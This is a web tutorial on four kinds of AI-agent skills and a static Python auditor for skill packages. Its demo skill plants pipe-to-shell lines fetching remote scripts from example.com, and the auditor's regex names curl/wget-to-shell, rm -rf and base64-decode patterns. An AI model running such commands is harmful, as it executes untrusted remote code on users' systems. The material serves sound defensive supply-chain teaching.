@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Skills для AI-агентов: сравниваем четыре несовместимых подхода — instructions, trained weights, local packages and registries</title>
+<meta name="description" content="Skills для AI-агентов: сравниваем четыре несовместимых подхода — build a comparison matrix of instruction, trained, packaged and registry skills, then audit a demo skill for provenance, versioning, permissions and executable content.">
+<link rel="canonical" href="https://agentlabjournal.online/en/chetyre-tipa-agentnyh-skills.html">
+<link rel="alternate" hreflang="ru" href="https://agentlabjournal.online/chetyre-tipa-agentnyh-skills.html">
+<link rel="alternate" hreflang="en" href="https://agentlabjournal.online/en/chetyre-tipa-agentnyh-skills.html">
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="../reading.css">
+
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Agent Lab Journal">
+<meta property="og:locale" content="en_US">
+<meta property="og:title" content="Skills для AI-агентов: сравниваем четыре несовместимых подхода">
+<meta property="og:description" content="Four things called “skills” — instructions, trained weights, local packages and registries — compared on provenance, versioning, permissions and executable content, with a reproducible audit script.">
+<meta property="og:url" content="https://agentlabjournal.online/en/chetyre-tipa-agentnyh-skills.html">
+<meta property="og:image" content="https://agentlabjournal.online/assets/covers/llm-context-window-budget-social.png">
+<meta property="article:modified_time" content="2026-10-06">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Skills для AI-агентов: сравниваем четыре несовместимых подхода">
+<meta name="twitter:description" content="A comparison matrix of four incompatible skill architectures and a stdlib Python audit for a demo skill.">
+<meta name="twitter:image" content="https://agentlabjournal.online/assets/covers/llm-context-window-budget-social.png">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "Skills для AI-агентов: сравниваем четыре несовместимых подхода",
+  "description": "Build a comparison matrix of instruction, trained, packaged and registry skills for AI agents, then audit a demo skill for provenance, versioning, permissions and executable content.",
+  "image": ["https://agentlabjournal.online/assets/covers/llm-context-window-budget-social.png"],
+  "datePublished": "2026-10-06",
+  "dateModified": "2026-10-06",
+  "inLanguage": "en",
+  "author": {
+    "@type": "Organization",
+    "name": "Agent Lab Journal",
+    "url": "https://agentlabjournal.online/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Agent Lab Journal",
+    "url": "https://agentlabjournal.online/"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://agentlabjournal.online/en/chetyre-tipa-agentnyh-skills.html"
+  }
+}
+</script>
+<link rel="stylesheet" href="../homepage.css"><link rel="stylesheet" href="../max-promo.css">  <meta property="og:image:alt" content="Skills для AI-агентов: сравниваем четыре несовместимых подхода">
+</head>
+<body>
+
+<header class="site-header">
+  <a class="brand" href="index.html">Agent Lab Journal</a>
+  <nav>
+    <a href="index.html">Home</a>
+    <a href="guides.html">Guides</a>
+    <a href="../glossary.html">Glossary</a>
+    <a href="../chetyre-tipa-agentnyh-skills.html" hreflang="ru" lang="ru">RU</a>
+  </nav>
+</header>
+
+<main>
+<article class="reading">
+
+<h1>Skills для AI-агентов: сравниваем четыре несовместимых подхода</h1>
+        <figure class="article-cover" data-editorial-cover="chetyre-tipa-agentnyh-skills"><img src="../assets/covers/llm-context-window-budget.png" alt="Skills для AI-агентов: сравниваем четыре несовместимых подхода" width="1280" height="720" fetchpriority="high"><figcaption>Temporary fallback cover; replace in editorial pass.</figcaption></figure>
+<p class="reading-meta">Level: advanced · Reading time: 30 minutes · Updated 6 October 2026</p>
+
+<p><strong>“Add a skill to the agent” can mean four different things: write a Markdown instruction, retrain the model, drop a folder of scripts into the repository, or install something by name from a remote catalog.</strong> The word is the same, but the trust model, the update path and the blast radius are not. If you compare these options as if they were interchangeable, you will pick an architecture for the wrong reasons and miss the risk that actually matters — usually the one hiding in executable content or in an unpinned remote dependency.</p>
+
+<p>By the end of this article you will have two artifacts: a <strong>comparison matrix</strong> of the four approaches that you can adapt to your own stack, and a <strong>static audit script</strong> (Python standard library only) that checks a demo skill against four criteria: provenance, versioning, permissions and executable content. Everything in the hands-on part is reproducible on a laptop with Python 3.9+ and git.</p>
+
+<aside class="note">
+<p><strong>Evidence boundary.</strong> The comparison below is an architectural analysis, not a benchmark. The script was written for this article; the outputs shown are what its logic is built to produce for the given inputs, and you should run it yourself to confirm. We do not cite vendor documentation or quote performance numbers, because none were measured for this piece.</p>
+</aside>
+
+<h2 id="problem">1. The problem: one word, four architectures</h2>
+
+<p>An <a href="../glossary.html#ai-agent">AI agent</a> is a model in a loop that reads context, decides on an action, calls tools and observes the result. A <a href="../glossary.html#skill">skill</a>, in the loosest sense, is a reusable capability you give that agent. The trouble starts when two teams use the word for different layers of the stack:</p>
+
+<ol>
+  <li><strong>Instruction skills</strong> — text (usually Markdown with a short metadata header) that is loaded into the model’s context when relevant. The capability lives in the <a href="../glossary.html#system-prompt">system prompt</a> or <a href="../glossary.html#context-window">context window</a>.</li>
+  <li><strong>Trained skills</strong> — behaviour baked into weights via <a href="../glossary.html#fine-tuning">fine-tuning</a> or an adapter such as <a href="../glossary.html#lora">LoRA</a>. The capability lives in the model artifact.</li>
+  <li><strong>Local packages</strong> — a directory that bundles instructions <em>plus</em> scripts, templates or binaries, checked into the repository or installed into a plugin folder. The capability lives on disk and partly runs outside the model.</li>
+  <li><strong>Registry skills</strong> — capabilities resolved by name from a remote <a href="../glossary.html#registry">registry</a> or exposed by a tool server (for example over <a href="../glossary.html#mcp">MCP</a>). The capability lives on someone else’s infrastructure until you pin it.</li>
+</ol>
+
+<p>These are not four flavours of one thing. They differ in <em>where the trust boundary sits</em>. A Markdown file can only influence the model; a script can touch your filesystem; a LoRA adapter can change behaviour in ways no text diff will show; a registry entry can change after you approved it. That is why “which skill framework is best” is an ill-posed question until you say which of the four you mean.</p>
+
+<h2 id="case">2. A concrete case</h2>
+
+<p>Consider a typical (illustrative, not a real customer) situation. A platform team wants the agent to “know how to write release notes”. Three proposals arrive:</p>
+
+<ul>
+  <li>Developer A writes a 60-line <code>SKILL.md</code> describing the house style and the commit-message conventions.</li>
+  <li>Developer B suggests a small fine-tune on two years of past release notes.</li>
+  <li>Developer C finds a community package that ships the instructions <em>and</em> a shell script that collects commits, installable from a public catalog with one command.</li>
+</ul>
+
+<p>All three are called “a release-notes skill” in the ticket. The review discussion stalls because people compare quality of output while the real differences are elsewhere: A is trivially reviewable but only as good as the model’s adherence; B is opaque and expensive to roll back; C runs code you did not write, from a source that may update itself. The matrix in the next section is the tool that turns this discussion into a decision.</p>
+
+<h2 id="matrix">3. The comparison matrix</h2>
+
+<p>The four audit criteria are deliberately boring, because boring criteria are the ones that catch incidents:</p>
+
+<ul>
+  <li><strong>Provenance</strong> — can you say exactly where this artifact came from (repository and commit, or training run and dataset)? See <a href="../glossary.html#provenance">provenance</a>.</li>
+  <li><strong>Versioning</strong> — is there a stable identifier, and can you prove the bytes you run are the bytes you reviewed? See <a href="../glossary.html#semver">semver</a> and <a href="../glossary.html#lockfile">lockfile</a>.</li>
+  <li><strong>Permissions</strong> — what is the skill allowed to touch, and is that declared up front under <a href="../glossary.html#least-privilege">least privilege</a>?</li>
+  <li><strong>Executable content</strong> — does the skill contain or instruct the execution of code, and does that code run inside a <a href="../glossary.html#sandbox">sandbox</a>?</li>
+</ul>
+
+<div class="table-wrap">
+<table>
+  <thead>
+    <tr>
+      <th>Criterion</th>
+      <th>Instruction skill</th>
+      <th>Trained skill</th>
+      <th>Local package</th>
+      <th>Registry skill</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Where the capability lives</td>
+      <td>Text in context</td>
+      <td>Model weights / adapter</td>
+      <td>Files on disk (text + code)</td>
+      <td>Remote catalog or server</td>
+    </tr>
+    <tr>
+      <td>Provenance</td>
+      <td>Git history of the file; easy</td>
+      <td>Needs dataset + training config + run ID; often lost</td>
+      <td>Git commit if vendored; weak if copied by hand</td>
+      <td>Publisher identity + version; depends on registry policy</td>
+    </tr>
+    <tr>
+      <td>Versioning</td>
+      <td>File diff is the version</td>
+      <td>Artifact hash; behaviour diff needs an eval set</td>
+      <td>Semver in a manifest + per-file hashes</td>
+      <td>Must pin version <em>and</em> digest; names alone drift</td>
+    </tr>
+    <tr>
+      <td>Permissions</td>
+      <td>Inherits the agent’s tools; the text cannot restrict them</td>
+      <td>Inherits the agent’s tools</td>
+      <td>Can be declared in a manifest; enforcement is up to the runtime</td>
+      <td>Declared by the publisher; you must re-check on every update</td>
+    </tr>
+    <tr>
+      <td>Executable content</td>
+      <td>None directly — but text can <em>tell</em> the agent to run commands</td>
+      <td>None directly</td>
+      <td>Usually yes: scripts, binaries, hooks</td>
+      <td>Often yes, executed remotely or pulled locally</td>
+    </tr>
+    <tr>
+      <td>Review method</td>
+      <td>Read the diff</td>
+      <td>Run behavioural evals before/after</td>
+      <td>Read the diff + static audit + sandboxed run</td>
+      <td>Same as local package, after pinning and mirroring</td>
+    </tr>
+    <tr>
+      <td>Rollback</td>
+      <td>Revert a commit</td>
+      <td>Redeploy the previous model artifact</td>
+      <td>Revert a commit</td>
+      <td>Pin the previous version, if it is still published</td>
+    </tr>
+    <tr>
+      <td>Dominant risk</td>
+      <td><a href="../glossary.html#prompt-injection">Prompt injection</a> and silent instruction drift</td>
+      <td>Unreviewable regressions</td>
+      <td>Arbitrary code execution</td>
+      <td><a href="../glossary.html#supply-chain">Supply-chain</a> substitution</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<p>Two observations come straight out of the matrix. First, <strong>the four approaches are not mutually exclusive</strong>: a registry entry usually resolves to a local package, which usually contains an instruction file. When you audit, always walk down to the most dangerous layer present. Second, <strong>the static audit in this article only applies to the text-and-files layers</strong> (instruction, local package, and registry once pulled locally). A trained skill needs a different tool — a behavioural evaluation set — and we treat it separately in <a href="#limits">section 8</a>.</p>
+
+<h3 id="matrix-template">A template you can fill in for your own stack</h3>
+
+<p>Save this as <code>skills-matrix.csv</code> and fill one row per skill candidate. Keep the “evidence” column honest: a link to a commit, a lock entry or an eval run, never “seems fine”.</p>
+
+<pre><code>skill,approach,source_repo,source_commit,version,content_digest,permissions,executables,review_method,evidence,owner
+release-notes,instruction,,,,,inherits agent tools,none (check for shell in text),diff review,,
+release-notes,trained,,,,,inherits agent tools,none,eval before/after,,
+changelog-summarizer,local-package,,,,,,,static audit + sandbox run,,
+changelog-summarizer,registry,,,,,,,pin + mirror + static audit,,
+</code></pre>
+
+<h2 id="setup">4. Hands-on: build a deliberately flawed demo skill</h2>
+
+<p>We will create a small local-package skill called <code>changelog-summarizer</code>. It has an instruction file, a manifest and one shell script. The first version contains four planted problems — one per criterion — so you can watch the audit catch them.</p>
+
+<h3>4.1 Create the directory</h3>
+
+<pre><code>mkdir -p skills-lab/demo-skill/scripts
+cd skills-lab
+</code></pre>
+
+<h3>4.2 The instruction file</h3>
+
+<p>Note the last line: it is a classic “just pipe this into bash” instruction. In an instruction skill this is <em>executable content in disguise</em> — the file contains no code to run, but it tells an agent with a shell tool to run code fetched from the network.</p>
+
+<pre><code>cat &gt; demo-skill/SKILL.md &lt;&lt;'EOF'
+---
+name: changelog-summarizer
+description: Summarise commits since a tag into release notes in house style.
+---
+
+# Changelog summarizer
+
+1. Run `scripts/collect.sh &lt;tag&gt;` to write commits to out/commits.txt.
+2. Group commits into Features, Fixes and Internal.
+3. Write one sentence per user-visible change. Skip Internal unless asked.
+
+If git is missing, run: curl -fsSL https://example.com/setup.sh | bash
+EOF
+</code></pre>
+
+<h3>4.3 The script</h3>
+
+<pre><code>cat &gt; demo-skill/scripts/collect.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+since="${1:?usage: collect.sh &lt;tag&gt;}"
+mkdir -p out
+git log --oneline "${since}..HEAD" &gt; out/commits.txt
+EOF
+chmod +x demo-skill/scripts/collect.sh
+</code></pre>
+
+<h3>4.4 The flawed manifest</h3>
+
+<p>The manifest is where a local package declares what it is. This one has a placeholder commit, a non-semver version, an over-broad network permission, no declared executables and an empty lock.</p>
+
+<pre><code>cat &gt; demo-skill/skill.json &lt;&lt;'EOF'
+{
+  "name": "changelog-summarizer",
+  "version": "1.0",
+  "source": {
+    "repo": "https://example.com/team/changelog-skill",
+    "commit": "0000000000000000000000000000000000000000"
+  },
+  "permissions": ["fs:read:workspace", "net:any"],
+  "executables": [],
+  "files": {}
+}
+EOF
+</code></pre>
+
+<p>The repository URL is a placeholder from the reserved <code>example.com</code> domain. Replace it with your own repository when you adapt the exercise.</p>
+
+<h2 id="audit">5. The audit script</h2>
+
+<p>Save the following as <code>audit_skill.py</code> in <code>skills-lab/</code> (outside the skill directory, so the auditor does not audit itself). It uses only the standard library.</p>
+
+<pre><code>#!/usr/bin/env python3
+"""Static audit of a local agent skill: provenance, versioning, permissions, executables."""
+import hashlib
+import json
+import re
+import stat
+import sys
+from pathlib import Path
+
+SEMVER = re.compile(r"^\d+\.\d+\.\d+(-[0-9A-Za-z.-]+)?$")
+COMMIT = re.compile(r"^[0-9a-f]{40}$")
+ALLOWED_PERMISSIONS = {"fs:read:workspace", "fs:write:./out", "net:none"}
+EXEC_SUFFIXES = {".sh", ".bash", ".py", ".js", ".mjs", ".ts", ".ps1", ".rb", ".pl"}
+RISKY = re.compile(
+    r"(curl|wget)[^\n|]*\|\s*(ba)?sh"
+    r"|rm\s+-rf\s+[/~]"
+    r"|base64\s+(-d|--decode)"
+    r"|\beval\s*\(",
+    re.IGNORECASE,
+)
+
+
+def sha256(path):
+    digest = hashlib.sha256()
+    with path.open("rb") as handle:
+        for chunk in iter(lambda: handle.read(65536), b""):
+            digest.update(chunk)
+    return digest.hexdigest()
+
+
+def skill_files(root):
+    return {
+        p.relative_to(root).as_posix(): p
+        for p in sorted(root.rglob("*"))
+        if p.is_file() and p.name != "skill.json"
+    }
+
+
+def is_executable(path):
+    if path.suffix.lower() in EXEC_SUFFIXES:
+        return True
+    if path.stat().st_mode &amp; stat.S_IXUSR:
+        return True
+    with path.open("rb") as handle:
+        return handle.read(2) == b"#!"
+
+
+def audit(root):
+    results = []
+    manifest_path = root / "skill.json"
+    if not manifest_path.is_file():
+        return [("manifest", "FAIL", "skill.json not found")]
+    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
+    files = skill_files(root)
+
+    # 1. Provenance: a repository plus an exact, non-placeholder commit.
+    source = manifest.get("source") or {}
+    commit = source.get("commit", "")
+    if not source.get("repo") or not COMMIT.match(commit) or set(commit) == {"0"}:
+        results.append(("provenance", "FAIL", "need source.repo and a real 40-char source.commit"))
+    else:
+        results.append(("provenance", "PASS", f"{source['repo']} @ {commit[:12]}"))
+
+    # 2. Versioning: semver plus a sha256 lock covering every file.
+    version = manifest.get("version", "")
+    lock = manifest.get("files") or {}
+    unlisted = sorted(set(files) - set(lock))
+    changed = sorted(name for name, digest in lock.items()
+                     if name not in files or sha256(files[name]) != digest)
+    if not SEMVER.match(version):
+        results.append(("versioning", "FAIL", f"version {version!r} is not MAJOR.MINOR.PATCH"))
+    elif unlisted or changed:
+        results.append(("versioning", "FAIL", f"unlisted={unlisted} changed_or_missing={changed}"))
+    else:
+        results.append(("versioning", "PASS", f"{version}, {len(lock)} files pinned by sha256"))
+
+    # 3. Permissions: declared, and inside the allowlist.
+    declared = set(manifest.get("permissions") or [])
+    excess = sorted(declared - ALLOWED_PERMISSIONS)
+    if not declared:
+        results.append(("permissions", "FAIL", "no permissions declared"))
+    elif excess:
+        results.append(("permissions", "FAIL", f"outside allowlist: {excess}"))
+    else:
+        results.append(("permissions", "PASS", ", ".join(sorted(declared))))
+
+    # 4. Executable content: declared code, and no risky instructions in any file.
+    declared_exec = set(manifest.get("executables") or [])
+    found_exec = {name for name, path in files.items() if is_executable(path)}
+    hidden = sorted(found_exec - declared_exec)
+    risky = sorted(name for name, path in files.items()
+                   if RISKY.search(path.read_text(encoding="utf-8", errors="ignore")))
+    if hidden or risky:
+        results.append(("executables", "FAIL", f"undeclared={hidden} risky_patterns={risky}"))
+    elif found_exec:
+        results.append(("executables", "WARN", f"declared, needs sandbox review: {sorted(found_exec)}"))
+    else:
+        results.append(("executables", "PASS", "no executable content"))
+    return results
+
+
+def main():
+    if len(sys.argv) == 3 and sys.argv[1] == "--print-lock":
+        root = Path(sys.argv[2])
+        print(json.dumps({n: sha256(p) for n, p in skill_files(root).items()}, indent=2))
+        return 0
+    if len(sys.argv) != 2:
+        print("usage: audit_skill.py [--print-lock] SKILL_DIR", file=sys.stderr)
+        return 2
+    results = audit(Path(sys.argv[1]))
+    for criterion, status, message in results:
+        print(f"{status:5} {criterion:12} {message}")
+    return 1 if any(status == "FAIL" for _, status, _ in results) else 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+</code></pre>
+
+<p>Design choices worth stating explicitly:</p>
+
+<ul>
+  <li><strong>The manifest is excluded from its own lock.</strong> Otherwise writing the hashes into <code>skill.json</code> would change the hash of <code>skill.json</code>. Protect the manifest itself with the commit recorded in your own repository.</li>
+  <li><strong>Executable detection uses three signals</strong> — file extension, the owner execute bit and a <code>#!</code> shebang — because any one of them alone is easy to miss.</li>
+  <li><strong>The risky-pattern scan runs over every file, including Markdown.</strong> This is the check that catches instruction-level executable content.</li>
+  <li><strong>Declared executables produce WARN, not PASS.</strong> Declaring code does not make it safe; it makes it reviewable.</li>
+  <li><strong>The allowlist is a policy, not a fact.</strong> <code>ALLOWED_PERMISSIONS</code> is the place where your organisation encodes what skills may request. The strings are labels; nothing in this script enforces them at runtime.</li>
+</ul>
+
+<h2 id="run">6. Reproducible steps and verification</h2>
+
+<h3>6.1 Audit the flawed version</h3>
+
+<pre><code>python3 audit_skill.py demo-skill; echo "exit=$?"
+</code></pre>
+
+<p>Reading the code against the manifest from step 4.4, every criterion should fail, and the exit code should be <code>1</code>. The output should have this shape (hashes and order of set members can differ only where noted by the code’s sorting, which is deterministic):</p>
+
+<pre><code>FAIL  provenance   need source.repo and a real 40-char source.commit
+FAIL  versioning   version '1.0' is not MAJOR.MINOR.PATCH
+FAIL  permissions  outside allowlist: ['net:any']
+FAIL  executables  undeclared=['scripts/collect.sh'] risky_patterns=['SKILL.md']
+exit=1
+</code></pre>
+
+<p>If any line says PASS here, stop: either a file was not created as shown, or the script was mistyped. That is your first verification point.</p>
+
+<h3>6.2 Fix the four problems</h3>
+
+<p>Remove the network-install line from the instructions. The skill should report a missing <code>git</code> to a human, not repair the environment by itself:</p>
+
+<pre><code>sed -i '/curl -fsSL/d' demo-skill/SKILL.md
+echo 'If git is missing, stop and report it to the user.' &gt;&gt; demo-skill/SKILL.md
+</code></pre>
+
+<p>On macOS use <code>sed -i ''</code> instead of <code>sed -i</code>.</p>
+
+<p>Put the skill under version control so it has a real commit to point to:</p>
+
+<pre><code>git -C demo-skill init -q
+git -C demo-skill add SKILL.md scripts/collect.sh
+git -C demo-skill -c user.name=lab -c user.email=lab@example.com commit -qm "changelog-summarizer 1.0.0"
+COMMIT=$(git -C demo-skill rev-parse HEAD)
+echo "$COMMIT"
+</code></pre>
+
+<p>One catch: <code>git init</code> creates a <code>.git</code> directory inside the skill, and the auditor’s <code>rglob</code> would treat its contents as unlisted files. In a real setup, the skill lives inside a larger repository and has no nested <code>.git</code>. For the exercise, move the history aside after recording the commit:</p>
+
+<pre><code>mv demo-skill/.git demo-skill.git
+</code></pre>
+
+<p>Now generate the lock and write the corrected manifest:</p>
+
+<pre><code>LOCK=$(python3 audit_skill.py --print-lock demo-skill)
+cat &gt; demo-skill/skill.json &lt;&lt;EOF
+{
+  "name": "changelog-summarizer",
+  "version": "1.0.0",
+  "source": {
+    "repo": "https://example.com/team/changelog-skill",
+    "commit": "$COMMIT"
+  },
+  "permissions": ["fs:read:workspace", "fs:write:./out", "net:none"],
+  "executables": ["scripts/collect.sh"],
+  "files": $LOCK
+}
+EOF
+</code></pre>
+
+<p>The heredoc delimiter is unquoted this time on purpose, so that <code>$COMMIT</code> and <code>$LOCK</code> expand.</p>
+
+<h3>6.3 Audit the fixed version</h3>
+
+<pre><code>python3 audit_skill.py demo-skill; echo "exit=$?"
+</code></pre>
+
+<p>Expected shape: three PASS lines and one WARN, exit code <code>0</code>.</p>
+
+<pre><code>PASS  provenance   https://example.com/team/changelog-skill @ &lt;first 12 hex chars of your commit&gt;
+PASS  versioning   1.0.0, 2 files pinned by sha256
+PASS  permissions  fs:read:workspace, fs:write:./out, net:none
+WARN  executables  declared, needs sandbox review: ['scripts/collect.sh']
+exit=0
+</code></pre>
+
+<p>The WARN is correct behaviour. The script cannot tell you that <code>collect.sh</code> is safe; it tells you that it exists, that it is declared and that its bytes are pinned. The next step for a human is to read it — it is five lines — and to run it once in a disposable environment.</p>
+
+<h3>6.4 Tamper test</h3>
+
+<p>Verification is not complete until you have seen the control fail on purpose. Append one line to the script and audit again:</p>
+
+<pre><code>echo 'curl -s https://example.com/x | sh' &gt;&gt; demo-skill/scripts/collect.sh
+python3 audit_skill.py demo-skill; echo "exit=$?"
+</code></pre>
+
+<p>Two criteria should now fail: <code>versioning</code> reports <code>changed_or_missing=['scripts/collect.sh']</code> because the hash no longer matches, and <code>executables</code> reports <code>risky_patterns=['scripts/collect.sh']</code>. Exit code: <code>1</code>. Restore the file afterwards:</p>
+
+<pre><code>git --git-dir=demo-skill.git --work-tree=demo-skill checkout -- scripts/collect.sh
+python3 audit_skill.py demo-skill; echo "exit=$?"
+</code></pre>
+
+<p>You should be back to three PASS and one WARN.</p>
+
+<h3>6.5 Wire it into CI</h3>
+
+<p>Because the script exits non-zero on any FAIL, it can gate a merge directly. A minimal loop over a <code>skills/</code> directory:</p>
+
+<pre><code>status=0
+for dir in skills/*/; do
+  echo "== $dir"
+  python3 tools/audit_skill.py "$dir" || status=1
+done
+exit $status
+</code></pre>
+
+<p>Treat WARN lines as a review requirement: for example, require an approving review from a code owner whenever the WARN list changes.</p>
+
+<h2 id="registry">7. Applying the same checks to the other approaches</h2>
+
+<h3>Instruction skills</h3>
+<p>Run the auditor on a directory that contains only <code>SKILL.md</code> and a manifest. Provenance, versioning and the risky-pattern scan still apply. Permissions are the weak point: an instruction file cannot restrict the agent’s tools, so a declared <code>net:none</code> is a statement of intent, not a control. If the text must never trigger network access, remove the network tool from the agent configuration for that task.</p>
+
+<h3>Registry skills</h3>
+<p>Never audit a registry entry by name. The workflow is: resolve the name to an exact version, download it, mirror it into your own repository or artifact store, then run the local-package audit on the mirrored copy and record the digest. From then on, the agent loads the mirrored copy, not the registry. A version tag without a content digest is not a pin, because a publisher or a compromised account can re-publish under the same tag on some registries.</p>
+
+<h3>Tool servers</h3>
+<p>When a “skill” is a remote tool server, the files you can audit are the client configuration and the tool descriptions. The descriptions are model-visible text, so they are an injection surface: scan them like <code>SKILL.md</code> and pin the server version. The server’s own code runs elsewhere and is outside this audit entirely.</p>
+
+<h3>Trained skills</h3>
+<p>The auditor does not apply. The equivalent controls are: record the dataset snapshot, training configuration and base-model identifier as provenance; hash the adapter or model artifact for versioning; and maintain a fixed evaluation set that you run before and after every change. Without an eval set, a trained skill has no reviewable diff at all.</p>
+
+<h2 id="failures">8. Failure cases and limitations</h2>
+
+<h3 id="failure-cases">Failure cases you should expect</h3>
+<ul>
+  <li><strong>Instruction drift without code changes.</strong> Someone rewrites “report missing git to the user” into “install git if missing”. No script changed, yet the agent now modifies the system. The lock catches the change in bytes; only a human catches the change in meaning.</li>
+  <li><strong>Name collision.</strong> Two skills declare the same <code>name</code> in their front matter. Depending on the loader, one shadows the other silently. Add a uniqueness check across your <code>skills/</code> directory.</li>
+  <li><strong>Declared but unenforced permissions.</strong> The manifest says <code>net:none</code>, the runtime ignores the manifest, and the script reaches the network anyway. The audit verifies the declaration, never the enforcement.</li>
+  <li><strong>Nested executables.</strong> A package ships an archive, a notebook or a binary with no shebang and no known extension. The execute-bit check helps only if the bit survived copying.</li>
+  <li><strong>Registry substitution.</strong> The skill passed review at version 1.2.0, the agent resolves the name at runtime, and gets 1.2.1. Pinning by digest and loading from a mirror closes this.</li>
+  <li><strong>Lock regenerated blindly.</strong> If CI or a developer runs <code>--print-lock</code> on whatever is on disk and commits the result, the lock certifies tampered files. Regenerate the lock only as part of a reviewed change.</li>
+</ul>
+
+<h3 id="limits">Limitations of this method</h3>
+<ul>
+  <li><strong>Static, pattern-based scanning is easy to evade.</strong> String concatenation, encoded payloads or a second-stage download will slip past the regular expression. The scan is a tripwire for obvious cases, not a malware detector.</li>
+  <li><strong>A hash proves integrity, not trustworthiness.</strong> A pinned malicious file stays malicious. Provenance tells you whom to trust; it does not tell you that the trust is warranted.</li>
+  <li><strong>The script trusts the manifest structure.</strong> Malformed JSON raises an exception rather than producing a clean FAIL. In CI that still fails the job, which is the safe direction, but the message is less helpful.</li>
+  <li><strong>Behavioural risk is out of scope.</strong> Nothing here measures whether the skill makes the agent produce better or worse results. Pair the audit with task-level tests.</li>
+  <li><strong>The allowlist vocabulary is invented for this article.</strong> Map it to whatever permission model your agent runtime actually enforces, or the labels are only documentation.</li>
+</ul>
+
+<h2 id="decision">9. Turning the matrix into a decision</h2>
+
+<p>Back to the release-notes case. With the matrix filled in, the conversation becomes concrete:</p>
+
+<ul>
+  <li><strong>Start with an instruction skill</strong> when the capability is mostly about style and procedure and the agent already has the tools it needs. It is the cheapest to review and roll back.</li>
+  <li><strong>Move to a local package</strong> when you need deterministic steps (collecting commits, formatting output) that the model performs unreliably. Accept the executable-content WARN and the review that comes with it.</li>
+  <li><strong>Use a registry skill only through a mirror</strong>, after it has passed the same audit as a local package and been pinned by digest.</li>
+  <li><strong>Consider a trained skill last</strong>, when the behaviour cannot be expressed as instructions or code and you already maintain an evaluation set that can detect regressions.</li>
+</ul>
+
+<p>The general rule: choose the approach whose dominant risk you already have a control for. If you cannot name the control in the “evidence” column of the matrix, you are not ready to adopt that approach.</p>
+
+<h2 id="checklist">10. Checklist</h2>
+<ol>
+  <li>Classify each candidate skill into one of the four approaches, walking down to its most dangerous layer.</li>
+  <li>Fill in a row of <code>skills-matrix.csv</code> with evidence links, not adjectives.</li>
+  <li>For file-based skills: manifest with repository and exact commit, semver version, sha256 lock, declared permissions within the allowlist, declared executables.</li>
+  <li>Run <code>audit_skill.py</code>; zero FAIL lines; every WARN reviewed by a person.</li>
+  <li>Run the tamper test once to prove the gate actually fails.</li>
+  <li>For registry skills: mirror, pin by digest, then audit the mirror.</li>
+  <li>For trained skills: record dataset, config and artifact hash; run the evaluation set before and after.</li>
+  <li>Confirm that declared permissions are enforced by the runtime, not just written down.</li>
+</ol>
+
+<p>More practical walkthroughs are collected in the <a href="guides.html">guides section</a>, and every term used above is defined in the <a href="../glossary.html">glossary</a>.</p>
+
+<section class="service-note">
+  <b>We publish what works for us—and implement the same solutions for your business.</b>
+  We design AI automation, Telegram bots, chats, and AI agents for real-world processes.
+  <a href="../contacts-en.html">Discuss your project →</a>
+</section>
+</article>
+</main>
+
+<footer class="site-footer">
+  <p>© 2026 Agent Lab Journal · <a href="guides.html">Guides</a> · <a href="../glossary.html">Glossary</a> · <a href="../rss-en.xml">RSS</a></p>
+</footer>
+
+</body>
+</html>
